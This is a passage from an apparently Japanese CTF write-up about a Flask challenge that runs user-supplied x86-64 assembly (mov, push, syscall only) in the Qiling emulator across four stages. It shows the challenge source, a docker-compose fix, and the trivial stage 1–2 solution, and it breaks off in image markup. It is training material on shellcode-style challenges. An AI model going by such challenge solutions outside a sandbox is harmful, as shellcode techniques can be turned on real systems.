<span class="token keyword">import</span> shutil
<span class="token keyword">import</span> time
<span class="token keyword">import</span> uuid

<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> qiling <span class="token keyword">import</span> Qiling
<span class="token keyword">from</span> qiling<span class="token punctuation">.</span>const <span class="token keyword">import</span> QL_ARCH<span class="token punctuation">,</span> QL_OS<span class="token punctuation">,</span> QL_VERBOSE
<span class="token keyword">from</span> qiling<span class="token punctuation">.</span>extensions <span class="token keyword">import</span> pipe

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> asm

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"id"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"1"</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/reset"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"1"</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"code"</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Please input the code."</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">";"</span> <span class="token keyword">in</span> code<span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Please remove the semicolon."</span><span class="token punctuation">)</span>
    lines <span class="token operator">=</span> code<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lines<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">25</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>
            <span class="token string">"index.html"</span><span class="token punctuation">,</span>
            <span class="token builtin">id</span><span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            error<span class="token operator">=</span><span class="token string">"Too many instructions. Please use less than 25 instructions."</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            order <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> order <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"mov"</span><span class="token punctuation">,</span> <span class="token string">"push"</span><span class="token punctuation">,</span> <span class="token string">"syscall"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>
                    <span class="token string">"index.html"</span><span class="token punctuation">,</span>
                    <span class="token builtin">id</span><span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                    error<span class="token operator">=</span><span class="token string">"Invalid instructions are included. Please use only mov, push, syscall."</span><span class="token punctuation">,</span>
                <span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        asm_code <span class="token operator">=</span> asm<span class="token punctuation">(</span>code<span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>
            <span class="token string">"index.html"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Failed to assemble the code. Please check the code."</span>
        <span class="token punctuation">)</span>

    <span class="token comment"># Debug</span>
    logpath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"logs"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".log"</span><span class="token punctuation">)</span>
    logf <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>logpath<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>
    logf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code <span class="token operator">+</span> <span class="token string">"\n"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
    logf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    dirname <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>dirname<span class="token punctuation">)</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"4"</span><span class="token punctuation">:</span>
        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>dirname<span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> <span class="token string">"ctf4b{fake_flag}"</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ql <span class="token operator">=</span> Qiling<span class="token punctuation">(</span>
        code<span class="token operator">=</span>asm_code<span class="token punctuation">,</span>
        rootfs<span class="token operator">=</span>dirname<span class="token punctuation">,</span>
        archtype<span class="token operator">=</span>QL_ARCH<span class="token punctuation">.</span>X8664<span class="token punctuation">,</span>
        ostype<span class="token operator">=</span>QL_OS<span class="token punctuation">.</span>LINUX<span class="token punctuation">,</span>
        verbose<span class="token operator">=</span>QL_VERBOSE<span class="token punctuation">.</span>DEFAULT<span class="token punctuation">,</span>
        log_file<span class="token operator">=</span>logpath<span class="token punctuation">,</span>
    <span class="token punctuation">)</span>

    ql<span class="token punctuation">.</span>os<span class="token punctuation">.</span>stdout <span class="token operator">=</span> pipe<span class="token punctuation">.</span>SimpleOutStream<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        ql<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>
            <span class="token string">"index.html"</span><span class="token punctuation">,</span>
            <span class="token builtin">id</span><span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            error<span class="token operator">=</span><span class="token string">"Failed to execute the code. Please check the code."</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>

    shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>dirname<span class="token punctuation">,</span> ignore_errors<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        stdout<span class="token operator">=</span>ql<span class="token punctuation">.</span>os<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        stdout <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>os<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    message <span class="token operator">=</span> <span class="token string">"Successfully executed the code!"</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">and</span> ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x123</span><span class="token punctuation">:</span>
        message <span class="token operator">=</span> <span class="token string">"Congratulation! Let's proceed to the next stage!"</span>
        session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"2"</span>
    <span class="token keyword">elif</span> session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">and</span> ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x123</span> <span class="token keyword">and</span> ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>stack_pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x123</span><span class="token punctuation">:</span>
        message <span class="token operator">=</span> <span class="token string">"Congratulation! Let's proceed to the next stage!"</span>
        session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"3"</span>
    <span class="token keyword">elif</span> session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"3"</span> <span class="token keyword">and</span> <span class="token string">"Hello"</span> <span class="token keyword">in</span> stdout<span class="token punctuation">:</span>
        message <span class="token operator">=</span> <span class="token string">"Congratulation! Let's proceed to the next stage!"</span>
        session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"4"</span>
    <span class="token keyword">elif</span> session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"4"</span> <span class="token keyword">and</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> <span class="token string">"ctf4b{fake_flag}"</span><span class="token punctuation">)</span> <span class="token keyword">in</span> stdout<span class="token punctuation">:</span>
        message <span class="token operator">=</span> <span class="token string">"Congratulation! You have completed all stages!"</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>
        <span class="token string">"index.html"</span><span class="token punctuation">,</span>
        <span class="token builtin">id</span><span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        message<span class="token operator">=</span>message<span class="token punctuation">,</span>
        stdout<span class="token operator">=</span>stdout<span class="token punctuation">,</span>
        rax<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        rbx<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rbx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        rcx<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rcx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        rdx<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rdx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        rsi<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rsi"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        rdi<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rdi"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        rbp<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rbp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        rip<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rip"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        rsp<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ql<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"rsp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre></div>
<p>このコードを見るとわかる通り、入力されたアセンブリコード(mov,push,syscall のみ使用可能、最大 25 行) を <code class="language-text">asm(code, arch="amd64", os="linux")</code> でバイナリ化したものを Qiling で実行しています。</p>
<p>アプリケーションでは全部で 4 つのステージが用意されており、ステージ 4 まで到達すると flag.txt を読み取り可能な状態になります。</p>
<h3 id="ローカル環境を用意する" style="position:relative;"><a href="#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E7%92%B0%E5%A2%83%E3%82%92%E7%94%A8%E6%84%8F%E3%81%99%E3%82%8B" aria-label="ローカル環境を用意する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ローカル環境を用意する</h3>
<p>まずは与えられた Dockerfile を使用してローカルの検証環境を構築します。</p>
<p>この時、私の環境では <code class="language-text">TypeError: HTTPConnection.request() got an unexpected keyword argument 'chunked'</code> というエラーで <code class="language-text">docker-compose build</code> に失敗したので一応解決方法を残しておきます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ <span class="token function">docker-compose</span> build
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:
  File <span class="token string">"/usr/lib/python3/dist-packages/docker/api/client.py"</span>, line <span class="token number">214</span>, <span class="token keyword">in</span> _retrieve_server_version
    <span class="token builtin class-name">return</span> self.version<span class="token punctuation">(</span>api_version<span class="token operator">=</span>False<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"ApiVersion"</span><span class="token punctuation">]</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/docker/api/daemon.py"</span>, line <span class="token number">181</span>, <span class="token keyword">in</span> version
    <span class="token builtin class-name">return</span> self._result<span class="token punctuation">(</span>self._get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>, <span class="token assign-left variable">json</span><span class="token operator">=</span>True<span class="token punctuation">)</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/docker/utils/decorators.py"</span>, line <span class="token number">46</span>, <span class="token keyword">in</span> inner
    <span class="token builtin class-name">return</span> f<span class="token punctuation">(</span>self, *args, **kwargs<span class="token punctuation">)</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/docker/api/client.py"</span>, line <span class="token number">237</span>, <span class="token keyword">in</span> _get
    <span class="token builtin class-name">return</span> self.get<span class="token punctuation">(</span>url, **self._set_request_timeout<span class="token punctuation">(</span>kwargs<span class="token punctuation">))</span>
  File <span class="token string">"/usr/local/lib/python3.10/dist-packages/requests/sessions.py"</span>, line <span class="token number">600</span>, <span class="token keyword">in</span> get
    <span class="token builtin class-name">return</span> self.request<span class="token punctuation">(</span><span class="token string">"GET"</span>, url, **kwargs<span class="token punctuation">)</span>
  File <span class="token string">"/usr/local/lib/python3.10/dist-packages/requests/sessions.py"</span>, line <span class="token number">587</span>, <span class="token keyword">in</span> request
    resp <span class="token operator">=</span> self.send<span class="token punctuation">(</span>prep, **send_kwargs<span class="token punctuation">)</span>
  File <span class="token string">"/usr/local/lib/python3.10/dist-packages/requests/sessions.py"</span>, line <span class="token number">701</span>, <span class="token keyword">in</span> send
    r <span class="token operator">=</span> adapter.send<span class="token punctuation">(</span>request, **kwargs<span class="token punctuation">)</span>
  File <span class="token string">"/usr/local/lib/python3.10/dist-packages/requests/adapters.py"</span>, line <span class="token number">486</span>, <span class="token keyword">in</span> send
    resp <span class="token operator">=</span> conn.urlopen<span class="token punctuation">(</span>
  File <span class="token string">"/usr/local/lib/python3.10/dist-packages/urllib3/connectionpool.py"</span>, line <span class="token number">790</span>, <span class="token keyword">in</span> urlopen
    response <span class="token operator">=</span> self._make_request<span class="token punctuation">(</span>
  File <span class="token string">"/usr/local/lib/python3.10/dist-packages/urllib3/connectionpool.py"</span>, line <span class="token number">496</span>, <span class="token keyword">in</span> _make_request
    conn.request<span class="token punctuation">(</span>
TypeError: HTTPConnection.request<span class="token punctuation">(</span><span class="token punctuation">)</span> got an unexpected keyword argument <span class="token string">'chunked'</span>

During handling of the above exception, another exception occurred:

Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:
  File <span class="token string">"/usr/bin/docker-compose"</span>, line <span class="token number">33</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
    sys.exit<span class="token punctuation">(</span>load_entry_point<span class="token punctuation">(</span><span class="token string">'docker-compose==1.29.2'</span>, <span class="token string">'console_scripts'</span>, <span class="token string">'docker-compose'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">))</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/compose/cli/main.py"</span>, line <span class="token number">81</span>, <span class="token keyword">in</span> main
    command_func<span class="token punctuation">(</span><span class="token punctuation">)</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/compose/cli/main.py"</span>, line <span class="token number">200</span>, <span class="token keyword">in</span> perform_command
    project <span class="token operator">=</span> project_from_options<span class="token punctuation">(</span><span class="token string">'.'</span>, options<span class="token punctuation">)</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/compose/cli/command.py"</span>, line <span class="token number">60</span>, <span class="token keyword">in</span> project_from_options
    <span class="token builtin class-name">return</span> get_project<span class="token punctuation">(</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/compose/cli/command.py"</span>, line <span class="token number">152</span>, <span class="token keyword">in</span> get_project
    client <span class="token operator">=</span> get_client<span class="token punctuation">(</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/compose/cli/docker_client.py"</span>, line <span class="token number">41</span>, <span class="token keyword">in</span> get_client
    client <span class="token operator">=</span> docker_client<span class="token punctuation">(</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/compose/cli/docker_client.py"</span>, line <span class="token number">170</span>, <span class="token keyword">in</span> docker_client
    client <span class="token operator">=</span> APIClient<span class="token punctuation">(</span>use_ssh_client<span class="token operator">=</span>not use_paramiko_ssh, **kwargs<span class="token punctuation">)</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/docker/api/client.py"</span>, line <span class="token number">197</span>, <span class="token keyword">in</span> __init__
    self._version <span class="token operator">=</span> self._retrieve_server_version<span class="token punctuation">(</span><span class="token punctuation">)</span>
  File <span class="token string">"/usr/lib/python3/dist-packages/docker/api/client.py"</span>, line <span class="token number">221</span>, <span class="token keyword">in</span> _retrieve_server_version
    raise DockerException<span class="token punctuation">(</span>
docker.errors.DockerException: Error <span class="token keyword">while</span> fetching server API version: HTTPConnection.request<span class="token punctuation">(</span><span class="token punctuation">)</span> got an unexpected keyword argument <span class="token string">'chunked'</span></code></pre></div>
<p>上記のようなエラーが出たため、以下のコードで requests のバージョンを 2.29.0 にダウングレードすることで問題を解消しました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token assign-left variable">requests</span><span class="token operator">==</span><span class="token number">2.29</span>.0</code></pre></div>
<p>以下の Issue にある通り、requests パッケージとの互換性の問題で発生するエラーのようです。</p>
<p>参考：<a href="https://github.com/docker/docker-py/issues/3113" target="_blank" rel="nofollow noopener noreferrer">urllib3 v2 incompatibility · Issue #3113 · docker/docker-py</a></p>
<h3 id="stage-1stage-2" style="position:relative;"><a href="#stage-1stage-2" aria-label="stage 1stage 2 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Stage 1、Stage 2</h3>
<p>まず始めに、Stage 1 と Stage 2 を突破します。</p>
<p>Stage 1 は RAX の値を 0x123 にし、Stage 2 はスタックトップに 0x123 を格納することでクリアできます。</p>
<p>そのため、以下のアセンブリコードを順に実行することで Stage 3 に進むことができました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">mov rax,0x123
push rax</code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/36d70c9a9cce9027cd901571c07d8345/afd0b/image-20240616105855558.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 73.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACQUlEQVQ4y53SS08TURgG4APazlChl+mc6QyFXmdaepmWlsYCGqEpRkI16BQCGqEsvEQjUaMbNxJXKIlLt14TIwuX/gkTdcP/ef2mbSgVHRIXT853zsx5Z76cw4x0Dnoqi6SRRULPIJZII5acQJzqSNxoz8ORBCSuIaiMdti1rB7HVbDxqI64HUAS+gR0I4MkjdFoEjK9wBWtj0xhcigMRYuAq2N97HWWSKZhGPQXY9H2y5z+QKGNiqJ2x56QGkbAG0B+eQvW/k9Yn7+juf8LzS8/sPr1AI0338AiMR1jkTg4pbdb4d2W2q0d1VmTgxxSfgaBlUcIWg/gu3wbvsYteK/chW/hBphEvUvt/qkVe4MDO5DLIQwnCxDqmxBmm2C5ObD8PJhZA8ucA+vbcBiq/UUvcEQvQqxvwDPdxEBhAWzqElnEqUKtE+gc9GegghGjBPfFLQzXNuGeXQUrL4JVGhgo1sF4aLx3FfioM/ujdPL+SAoe8wJGivMYLsxBSFUgpM9iSC+BBYJeOm46UY2ugjp6Iq7ZVyRMt0Gl8FAbD2mHWM58Cu5Nwe8+A0n0IyD6HPnFAHzH+OETyJAEVt3eweTDFnL3lpG/3yTWfzG3V5BpNcCyd+ZRer6K0s46jWtkvWvtyNrJyi+uw3x8FcxjLUHYsCDevAZx418sh2cdQquJoZUlsMHdJ2DvX4J9eNW116s/dut3u87ekk97GHz9DEysmHCdr8A1XYKrSmbKVJc7c7uuTsJVzhPT0ekpE0Ihi9+guse7N3IpQAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/36d70c9a9cce9027cd901571c07d8345/8ac56/image-20240616105855558.webp 240w,
/static/36d70c9a9cce9027cd901571c07d8345/d3be9/image-20240616105855558.webp 480w,
/static/36d70c9a9cce9027cd901571c07d8345/e46b2/image-20240616105855558.webp 960w,
/static/36d70c9a9cce9027cd901571c07d8345/99eb3/image-20240616105855558.webp 1153w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/36d70c9a9cce9027cd901571c07d8345/8ff5a/image-20240616105855558.png 240w,
/static/36d70c9a9cce9027cd901571c07d8345/e85cb/image-20240616105855558.png 480w,
/static/36d70c9a9cce9027cd901571c07d8345/d9199/image-20240616105855558.png 960w,
/static/36d70c9a9cce9027cd901571c07d8345/afd0b/image-20240616105855558.png 1153w"
